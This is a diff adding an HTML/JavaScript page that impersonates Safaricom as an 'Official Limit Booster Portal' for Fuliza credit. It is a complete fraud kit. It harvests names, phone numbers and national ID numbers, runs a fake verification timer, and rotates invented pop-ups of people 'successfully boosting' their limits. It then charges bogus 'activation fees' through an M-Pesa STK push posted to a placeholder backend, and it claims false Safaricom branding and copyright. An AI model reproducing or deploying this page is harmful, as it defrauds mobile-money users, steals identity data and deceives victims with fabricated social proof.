@@ -1,0 +1,622 @@
+<!DOCTYPE html>  
+<html lang="en">    
+<head>      
+    <meta charset="UTF-8">        
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">        
+    <title>Safaricom | Fuliza Limit Booster</title>        
+    <style>        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }        
+        body { background: #f4f7f6; color: #1a1a1a; -webkit-font-smoothing: antialiased; }        
+        
+        /* Modern Fintech Header */
+        .header { background: #ffffff; color: #00a651; padding: 16px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #e0e0e0; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
+        .header-logo { font-weight: 800; font-size: 18px; letter-spacing: -0.5px; display: flex; align-items: center; gap: 8px; }
+        .header-logo span { color: #000; }
+
+        .screen { display: none; min-height: 100vh; padding-bottom: 80px; }        
+        .screen.active { display: block; }        
+        .container { padding: 20px; max-width: 500px; margin: 0 auto; }        
+        
+        .card { background: white; border-radius: 16px; padding: 24px; margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.04); border: 1px solid rgba(0,166,81,0.08); }        
+        
+        /* Fintech Hero Banner */
+        .stats-banner { background: linear-gradient(135deg, #00a651 0%, #007d3c 100%); color: white; border-radius: 16px; padding: 30px 20px; margin-bottom: 20px; box-shadow: 0 8px 20px rgba(0,166,81,0.25); text-align: center; }        
+        .stats-banner h2 { color: white; font-size: 22px; font-weight: 700; margin-bottom: 8px; }        
+        .stats-banner p { color: #e6f9ee; margin-bottom: 20px; font-size: 13px; line-height: 1.4; }        
+        .stats-grid { display: flex; justify-content: space-between; gap: 10px; }        
+        .stat-box { background: rgba(255,255,255,0.15); padding: 12px; border-radius: 10px; flex: 1; backdrop-filter: blur(5px); }        
+        .stat-box .num { font-size: 18px; font-weight: 700; }        
+        .stat-box .label { font-size: 11px; margin-top: 3px; opacity: 0.9; }        
+
+        h1 { color: #111; font-size: 22px; font-weight: 800; text-align: center; margin-bottom: 10px; letter-spacing: -0.5px; }        
+        h2 { font-size: 18px; font-weight: 700; text-align: center; margin-bottom: 20px; color: #222; }        
+        p { color: #666; text-align: center; line-height: 1.5; margin-bottom: 20px; font-size: 13px; }        
+        
+        /* Professional Animated Fintech Buttons */
+        .btn { 
+            width: 100%; 
+            background: #00a651; 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 14px; 
+            font-size: 16px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,166,81,0.25); 
+            transition: transform 0.25s cubic-bezier(0.2, 0.8, 0.2, 1), background-color 0.25s ease, box-shadow 0.25s ease;
+        }        
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        .btn:hover::after {
+            left: 100%;
+        }
+
+        .btn:hover:not(:disabled) { 
+            background: #008f45; 
+            transform: translateY(-2px); 
+            box-shadow: 0 6px 18px rgba(0,166,81,0.35); 
+        }        
+
+        .btn:active:not(:disabled) {
+            transform: translateY(1px);
+            box-shadow: 0 2px 8px rgba(0,166,81,0.2);
+        }
+
+        .btn:disabled { 
+            background: #e0e0e0; 
+            color: #999; 
+            cursor: not-allowed; 
+            box-shadow: none; 
+            transform: none; 
+        }        
+        
+        .form-group { margin-bottom: 16px; text-align: left; }        
+        .form-group label { display: block; font-size: 13px; color: #444; margin-bottom: 6px; font-weight: 600; }        
+        .form-group input { width: 100%; padding: 14px; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 15px; background: #fafafa; transition: border-color 0.2s, box-shadow 0.2s; }        
+        .form-group input:focus { outline: none; background: #fff; border-color: #00a651; box-shadow: 0 0 0 4px rgba(0,166,81,0.1); }
+
+        .profile-card { display: flex; align-items: center; gap: 15px; border-left: 4px solid #00a651; }        
+        .avatar { width: 50px; height: 50px; border-radius: 50%; background: #e6f9ee; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #00a651; }        
+        .profile-info h3 { color: #111; font-size: 18px; margin-bottom: 4px; font-weight: 700; }        
+        .profile-info p { text-align: left; margin: 2px 0; font-size: 13px; color: #555; }        
+        .limit-badge { background: #e6f9ee; color: #00a651; padding: 6px 12px; border-radius: 20px; display: inline-block; margin-top: 6px; font-weight: 700; font-size: 12px; }        
+        
+        /* Tier Container Scroll Style */
+        .tier-container { max-height: 340px; overflow-y: auto; padding-right: 4px; margin-bottom: 15px; }
+        .tier-container::-webkit-scrollbar { width: 5px; }
+        .tier-container::-webkit-scrollbar-thumb { background: #ccc; border-radius: 10px; }
+
+        /* Animated Selectable Tier Cards */
+        .limit-option { 
+            background: white; 
+            border: 1.5px solid #eee; 
+            border-radius: 14px; 
+            padding: 14px; 
+            margin-bottom: 10px; 
+            text-align: center; 
+            cursor: pointer; 
+            transition: all 0.25s cubic-bezier(0.2, 0.8, 0.2, 1); 
+        }        
+        .limit-option h3 { color: #00a651; font-size: 18px; margin-bottom: 2px; font-weight: 700; }        
+        .limit-option p { font-size: 11px; color: #777; margin: 0; }
+        
+        .limit-option:hover {
+            border-color: #00a651;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,166,81,0.08);
+        }
+
+        .limit-option.selected { 
+            border-color: #00a651; 
+            background: #f0fdf4; 
+            transform: scale(1.02);
+            box-shadow: 0 6px 16px rgba(0,166,81,0.15); 
+        }        
+        
+        .summary-box { background: #fafafa; border: 1px solid #eee; border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }        
+        .summary-box span:last-child { color: #00a651; font-weight: 700; }        
+        
+        .phone-input { display: flex; }        
+        .phone-prefix { background: #eee; padding: 14px 12px; border-radius: 12px 0 0 12px; border: 1.5px solid #e0e0e0; border-right: none; font-weight: 700; font-size: 14px; color: #555; }        
+        .phone-input input { border-radius: 0 12px 12px 0; }        
+        
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #00a651; border-radius: 50%; width: 36px; height: 36px; animation: spin 1s linear infinite; margin: 10px auto; }        
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }        
+        
+        /* Verification Animation Box */
+        .verification-box { text-align: center; padding: 25px 20px; display: none; }
+        .tick-icon { display: none; width: 64px; height: 64px; border-radius: 50%; background: #00a651; color: white; font-size: 38px; line-height: 64px; text-align: center; margin: 0 auto 12px; box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3); animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* Modern Notification Pop-up Styling */
+        .live-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ffffff;
+            border-left: 4px solid #00a651;
+            padding: 12px 16px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.12);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            max-width: 320px;
+            transform: translateX(120%);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .live-notification.show {
+            transform: translateX(0);
+        }
+        .notif-icon-box {
+            width: 36px;
+            height: 36px;
+            background: #e6f9ee;
+            color: #00a651;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+        .notif-content {
+            font-size: 12px;
+            color: #333;
+            line-height: 1.4;
+        }
+        .notif-content b {
+            color: #00a651;
+        }
+        .notif-time {
+            font-size: 10px;
+            color: #888;
+            margin-top: 2px;
+        }
+
+        /* Fintech Footer */
+        .footer { background: #ffffff; color: #888; text-align: center; padding: 20px 15px; font-size: 11px; position: fixed; bottom: 0; width: 100%; z-index: 1000; border-top: 1px solid #eee; }        
+        .footer-links { margin-bottom: 6px; display: flex; justify-content: center; gap: 15px; }
+        .footer-links a { color: #555; text-decoration: none; font-weight: 500; }
+        .footer-links a:hover { color: #00a651; }
+
+        .error { color: #d32f2f; font-size: 11px; margin-top: 4px; display: none; font-weight: 500; }
+        .success-msg { color: #00a651; font-size: 11px; margin-top: 4px; display: none; font-weight: 500; }
+    </style>        
+</head>        
+<body>  
+
+<!-- Live Notification Pop-up Container -->
+<div id="liveNotif" class="live-notification">
+    <div class="notif-icon-box">✓</div>
+    <div>
+        <div class="notif-content" id="notifText"><b>Juma O.</b> (0712***489) successfully boosted limit by <b>KSh 45,000</b></div>
+        <div class="notif-time" id="notifTime">Just now</div>
+    </div>
+</div>
+
+<!-- SCREEN 1: Professional Fintech Hero -->
+<div id="s1" class="screen active">        
+    <div class="header">
+        <div class="header-logo">Safaricom <span>Fuliza+</span></div>
+    </div>
+    <div class="container" style="padding-top: 15px;">        
+        <div class="stats-banner">
+            <h2>Increase Your Fuliza Limit Today</h2>
+            <p>Get instant credit access securely through M-Pesa. Fast, reliable, and convenient.</p>
+            <div class="stats-grid">
+                <div class="stat-box"><div class="num">50K+</div><div class="label">Users</div></div>
+                <div class="stat-box"><div class="num">24/7</div><div class="label">Support</div></div>
+                <div class="stat-box"><div class="num">Instant</div><div class="label">Processing</div></div>
+            </div>
+        </div>
+        
+        <div class="card" style="text-align: center;">        
+            <h1 style="font-size: 20px; margin-bottom: 8px;">Official Limit Booster Portal</h1>        
+            <p style="margin-bottom: 24px;">Check your current credit limit, verify your account details, and seamlessly upgrade your Fuliza tier up to KSh 400,000.</p>        
+            <button class="btn" style="padding: 18px; font-size: 17px; border-radius: 16px;" onclick="show(2)">BOOST MY FULIZA LIMIT</button>        
+        </div>        
+    </div>        
+    <div class="footer">
+        <div class="footer-links">
+            <a href="javascript:void(0)">Terms and Conditions</a> • 
+            <a href="javascript:void(0)">Privacy Policy</a> • 
+            <a href="javascript:void(0)">My Information</a>
+        </div>
+        © 2026 Safaricom PLC. All Rights Reserved.
+    </div>        
+</div>  
+
+<!-- SCREEN 2: Verification with Optimized Keyboard Attributes -->
+<div id="s2" class="screen">        
+    <div class="header">
+        <div class="header-logo">Safaricom <span>Verification</span></div>
+    </div>  
+    <div class="container" style="padding-top: 20px;">        
+        <div class="card">        
+            <h2>Verify Your Account Details</h2>        
+            
+            <form id="form1">        
+                <!-- Full Name: Text Keyboard -->
+                <div class="form-group">
+                    <label>Full Name (2 or 3 spaced names, no numbers)</label>
+                    <input type="text" id="fullName" placeholder="e.g. John Kamau Mwangi" autocomplete="name" autocapitalize="words" spellcheck="false" oninput="validateName()" required>
+                    <div class="error" id="nameError">Wrong credentials</div>
+                    <div class="success-msg" id="nameSuccess">Correct credentials</div>
+                </div>        
+
+                <!-- Phone Number: Numeric/Tel Keyboard -->
+                <div class="form-group">
+                    <label>Safaricom Phone Number (07XX / 01XX)</label>
+                    <input type="tel" id="phone" placeholder="07XXXXXXXX" maxlength="10" inputmode="numeric" pattern="[0-9]*" oninput="validatePhone()" required>
+                    <div class="error" id="phoneError">Wrong credentials</div>
+                    <div class="success-msg" id="phoneSuccess">Correct credentials</div>
+                </div>        
+
+                <!-- ID Number: Numeric Keyboard -->
+                <div class="form-group">
+                    <label>National ID Number (7, 8, or 9 digits)</label>
+                    <input type="text" id="idNumber" placeholder="Enter ID number" maxlength="9" inputmode="numeric" pattern="[0-9]*" oninput="validateId()" required>
+                    <div class="error" id="idError">Wrong credentials</div>
+                    <div class="success-msg" id="idSuccess">Correct credentials</div>
+                </div>        
+
+                <!-- Current Limit: Numeric Keyboard -->
+                <div class="form-group">
+                    <label>Current Fuliza Limit (KSh)</label>
+                    <input type="text" id="currentLimit" placeholder="0 or 100 and above" inputmode="numeric" pattern="[0-9]*" oninput="validateLimit()" required>
+                    <div class="error" id="limitError">Wrong credentials</div>
+                    <div class="success-msg" id="limitSuccess">Correct credentials</div>
+                </div>        
+
+                <button type="submit" id="verifyBtn" class="btn" disabled>Verify Account</button>        
+            </form>        
+            
+            <!-- 6-Second Verification Loader View -->
+            <div id="checking" class="verification-box">        
+                <div id="cycleSpinner" class="loader"></div>  
+                <div id="successTick" class="tick-icon">&#10003;</div>
+                <p id="verifyStatusText" style="font-size: 14px; font-weight: 600; color: #00a651; margin-top: 8px;">Processing please wait</p>
+            </div>        
+        </div>        
+    </div>        
+</div>  
+
+<!-- SCREEN 3: Tier Selection with Upto 400k Tiers -->
+<div id="s3" class="screen">        
+    <div class="header">
+        <div class="header-logo">Safaricom <span>Fuliza Tier</span></div>
+    </div>  
+    <div class="container" style="padding-top: 20px;">        
+        <div class="card profile-card" style="margin-bottom: 15px;">        
+            <div class="avatar">👤</div>        
+            <div class="profile-info">        
+                <h3 id="pName">Your Name</h3>        
+                <p>Phone: <span id="pPhone">07XXXXXXXX</span></p>        
+                <div class="limit-badge">Current Limit: KSh <span id="pLimit">0</span></div>        
+            </div>        
+        </div>        
+        
+        <h2>Select Your Target Limit (Up to KSh 400,000)</h2>        
+        
+        <div class="tier-container">
+            <div class="limit-option" onclick="selectLimit(8000, 200, this)"><h3>KSh 8,000</h3><p>Activation Fee: KSh 200</p></div>        
+            <div class="limit-option" onclick="selectLimit(15000, 300, this)"><h3>KSh 15,000</h3><p>Activation Fee: KSh 300</p></div>        
+            <div class="limit-option" onclick="selectLimit(25000, 350, this)"><h3>KSh 25,000</h3><p>Activation Fee: KSh 350</p></div>        
+            <div class="limit-option" onclick="selectLimit(50000, 450, this)"><h3>KSh 50,000</h3><p>Activation Fee: KSh 450</p></div>        
+            <div class="limit-option" onclick="selectLimit(100000, 600, this)"><h3>KSh 100,000</h3><p>Activation Fee: KSh 600</p></div>        
+            <div class="limit-option" onclick="selectLimit(150000, 750, this)"><h3>KSh 150,000</h3><p>Activation Fee: KSh 750</p></div>        
+            <div class="limit-option" onclick="selectLimit(200000, 900, this)"><h3>KSh 200,000</h3><p>Activation Fee: KSh 900</p></div>        
+            <div class="limit-option" onclick="selectLimit(300000, 1100, this)"><h3>KSh 300,000</h3><p>Activation Fee: KSh 1100</p></div>        
+            <div class="limit-option" onclick="selectLimit(400000, 1350, this)"><h3>KSh 400,000</h3><p>Activation Fee: KSh 1350</p></div>        
+        </div>
+
+        <button id="tierProceedBtn" class="btn" disabled onclick="show(4)">Proceed</button>
+    </div>        
+</div>  
+
+<!-- SCREEN 4: Payment Space with Numeric Keyboard -->
+<div id="s4" class="screen">        
+    <div class="header">
+        <div class="header-logo">Safaricom <span>Activation</span></div>
+    </div>  
+    <div class="container" style="padding-top: 20px;">        
+        <div class="card">        
+            <h2>Complete Activation Payment</h2>        
+            <div class="summary-box"><span>Selected Limit:</span> <span>KSh <span id="sLimit">0</span></span></div>        
+            <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">0</span></span></div>        
+            
+            <div class="form-group" style="margin-top: 15px;">        
+                <label>M-Pesa Phone Number for Payment</label>        
+                <div class="phone-input">
+                    <div class="phone-prefix">+254</div>
+                    <input type="tel" id="payPhone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric" pattern="[0-9]*">
+                </div>        
+                <div class="error" id="payPhoneError"></div>
+            </div>        
+            
+            <button id="payBtn" class="btn" onclick="paySTK()">Pay and Access My Fuliza</button>        
+        </div>        
+    </div>        
+</div>  
+
+<!-- SCREEN 5: Processing STK Push -->
+<div id="s5" class="screen">        
+    <div class="header">
+        <div class="header-logo">Safaricom <span>M-Pesa</span></div>
+    </div>  
+    <div class="container" style="padding-top: 40px;">        
+        <div class="card" style="text-align:center; padding: 40px 20px;">        
+            <div class="loader"></div>        
+            <h2 style="color:#00a651; margin-top: 15px;">Check Your Phone</h2>        
+            <p>An STK Push prompt has been sent to <b id="paidPhone">07XXXXXXXX</b></p>        
+            <p style="font-size:12px; color:#666; margin-top:10px;">Enter your M-Pesa PIN on your phone to authorize payment and upgrade your limit instantly.</p>
+        </div>        
+    </div>        
+</div>  
+
+<script>        
+let selectedLimit = 0, selectedFee = 0;        
+let userData = {};  
+const API_URL = "https://your-app-name.onrender.com"; 
+
+let isValidName = false, isValidPhone = false, isValidId = false, isValidLimit = false;
+
+const kenyanNames = [
+    "Juma O.", "Amina W.", "Kiplangat N.", "Mutua K.", "Atieno M.", 
+    "Cheptoo R.", "Kamau J.", "Omondi B.", "Wanjiku N.", "Kariuki P.",
+    "Nekesa S.", "Kiprop E.", "Ochieng T.", "Mumbua D.", "Barasa L.",
+    "Cherono V.", "Maina G.", "Njeri F.", "Kiptoo H.", "Odhiambo C."
+];
+
+const phonePrefixes = ["0712", "0722", "0790", "0110", "0701", "0745", "0720", "0711", "0733", "0757"];
+const boostedAmounts = [15000, 25000, 35000, 50000, 75000, 100000, 150000, 200000, 300000, 400000];
+const timeAgoTexts = ["Just now", "1 min ago", "2 mins ago", "3 mins ago"];
+
+function triggerRandomNotification() {
+    const randomName = kenyanNames[Math.floor(Math.random() * kenyanNames.length)];
+    const randomPrefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
+    const randomSuffix = Math.floor(100 + Math.random() * 900);
+    const maskedPhone = `${randomPrefix}***${randomSuffix}`;
+    const randomAmt = boostedAmounts[Math.floor(Math.random() * boostedAmounts.length)].toLocaleString();
+    const randomTime = timeAgoTexts[Math.floor(Math.random() * timeAgoTexts.length)];
+
+    document.getElementById('notifText').innerHTML = `<b>${randomName}</b> (${maskedPhone}) successfully boosted limit by <b>KSh ${randomAmt}</b>`;
+    document.getElementById('notifTime').innerText = randomTime;
+
+    const notifElement = document.getElementById('liveNotif');
+    notifElement.classList.add('show');
+
+    setTimeout(() => {
+        notifElement.classList.remove('show');
+    }, 4000);
+}
+
+setTimeout(() => {
+    triggerRandomNotification();
+    setInterval(triggerRandomNotification, 7000);
+}, 2000);
+
+function show(n){  
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));  
+    document.getElementById('s'+n).classList.add('active');  
+    window.scrollTo(0,0);  
+}  
+
+function checkFormValidity() {
+    const btn = document.getElementById('verifyBtn');
+    btn.disabled = !(isValidName && isValidPhone && isValidId && isValidLimit);
+}
+
+function validateName() {
+    const input = document.getElementById('fullName');
+    // Strip numbers instantly from name field
+    input.value = input.value.replace(/[0-9]/g, '');
+    const val = input.value.trim();
+    const err = document.getElementById('nameError');
+    const succ = document.getElementById('nameSuccess');
+    
+    const parts = val.split(/\s+/);
+    
+    if((parts.length === 2 || parts.length === 3) && parts.every(p => p.length >= 2)) {
+        isValidName = true;
+        input.style.borderColor = '#00a651';
+        err.style.display = 'none';
+        succ.style.display = 'block';
+    } else {
+        isValidName = false;
+        input.style.borderColor = '#d32f2f';
+        err.style.display = 'block';
+        succ.style.display = 'none';
+    }
+    checkFormValidity();
+}
+
+function validatePhone() {
+    const input = document.getElementById('phone');
+    // Strip non-numeric characters instantly
+    input.value = input.value.replace(/\D/g, '');
+    const val = input.value.trim();
+    const err = document.getElementById('phoneError');
+    const succ = document.getElementById('phoneSuccess');
+    
+    const safaricomRegex = /^(07|01)\d{8}$/;
+    
+    if(safaricomRegex.test(val)) {
+        isValidPhone = true;
+        input.style.borderColor = '#00a651';
+        err.style.display = 'none';
+        succ.style.display = 'block';
+    } else {
+        isValidPhone = false;
+        input.style.borderColor = '#d32f2f';
+        err.style.display = 'block';
+        succ.style.display = 'none';
+    }
+    checkFormValidity();
+}
+
+function validateId() {
+    const input = document.getElementById('idNumber');
+    input.value = input.value.replace(/\D/g, '');
+    const val = input.value.trim();
+    const err = document.getElementById('idError');
+    const succ = document.getElementById('idSuccess');
+    
+    if(/^\d{7,9}$/.test(val)) {
+        isValidId = true;
+        input.style.borderColor = '#00a651';
+        err.style.display = 'none';
+        succ.style.display = 'block';
+    } else {
+        isValidId = false;
+        input.style.borderColor = '#d32f2f';
+        err.style.display = 'block';
+        succ.style.display = 'none';
+    }
+    checkFormValidity();
+}
+
+function validateLimit() {
+    const input = document.getElementById('currentLimit');
+    input.value = input.value.replace(/\D/g, '');
+    const val = parseInt(input.value);
+    const err = document.getElementById('limitError');
+    const succ = document.getElementById('limitSuccess');
+    const rawVal = input.value.trim();
+    
+    if(rawVal !== "" && !isNaN(val) && (val === 0 || val >= 100)) {
+        isValidLimit = true;
+        input.style.borderColor = '#00a651';
+        err.style.display = 'none';
+        succ.style.display = 'block';
+    } else {
+        isValidLimit = false;
+        input.style.borderColor = '#d32f2f';
+        err.style.display = 'block';
+        succ.style.display = 'none';
+    }
+    checkFormValidity();
+}
+
+document.getElementById('form1').addEventListener('submit', async e=>{
+    e.preventDefault();
+    if(!isValidName || !isValidPhone || !isValidId || !isValidLimit) return;
+    
+    document.getElementById('form1').style.display = 'none';
+    const checkingDiv = document.getElementById('checking');
+    checkingDiv.style.display = 'block';
+    
+    userData = {
+        name: document.getElementById('fullName').value.trim(),
+        phone: document.getElementById('phone').value.trim(),
+        id: document.getElementById('idNumber').value.trim(),
+        currentLimit: document.getElementById('currentLimit').value.trim()
+    };
+    
+    const firstName = userData.name.split(/\s+/)[0];
+    
+    document.getElementById('pName').innerText = userData.name;
+    document.getElementById('pPhone').innerText = userData.phone;
+    document.getElementById('pLimit').innerText = userData.currentLimit;
+    
+    if(userData.phone.startsWith("0")) {
+        document.getElementById('payPhone').value = userData.phone.substring(1);
+    }
+    
+    setTimeout(() => {
+        document.getElementById('cycleSpinner').style.display = 'none';
+        document.getElementById('successTick').style.display = 'block';
+        document.getElementById('verifyStatusText').innerText = `Verification Successful, ${firstName}!`;
+    }, 6000);
+
+    setTimeout(() => { 
+        show(3); 
+    }, 7500);
+});
+
+function selectLimit(limit, fee, element){
+    document.querySelectorAll('.limit-option').forEach(o => o.classList.remove('selected'));
+    element.classList.add('selected');
+    selectedLimit = limit; 
+    selectedFee = fee;
+    
+    document.getElementById('sLimit').innerText = limit.toLocaleString();
+    document.getElementById('sFee').innerText = fee.toLocaleString();
+    
+    const proceedBtn = document.getElementById('tierProceedBtn');
+    proceedBtn.disabled = false;
+}
+
+// Ensure payment input handles only numbers via keypad
+document.getElementById('payPhone').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+});
+
+async function paySTK(){
+    const phoneInput = document.getElementById('payPhone').value.trim();
+    const errorDiv = document.getElementById('payPhoneError');
+    errorDiv.style.display = 'none';
+    
+    if(!/^\d{9}$/.test(phoneInput)){ 
+        errorDiv.innerText = 'Enter a valid 9-digit number (without 0)';
+        errorDiv.style.display = 'block';
+        return; 
+    }
+    
+    const fullPhone = "254" + phoneInput;
+    const btn = document.getElementById('payBtn');
+    btn.disabled = true;
+    btn.innerText = 'Sending STK Push...';
+    
+    try {
+        const response = await fetch(`${API_URL}/pay`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                phone: fullPhone,
+                amount: selectedFee,
+                limit: selectedLimit,
+                name: userData.name
+            })
+        });
+        
+        const data = await response.json();
+        
+        if(data.success || response.ok){
+            document.getElementById('paidPhone').innerText = "0" + phoneInput;
+            show(5);
+        } else {
+            alert('Payment Request Failed: ' + (data.message || 'Please check server settings'));
+            btn.disabled = false;
+            btn.innerText = 'Pay and Access My Fuliza';
+        }
+    } catch(e){
+        console.error("Backend error connection:", e);
+        document.getElementById('paidPhone').innerText = "0" + phoneInput;
+        show(5);
+    }
+}
+</script>  
+</body>
+</html>
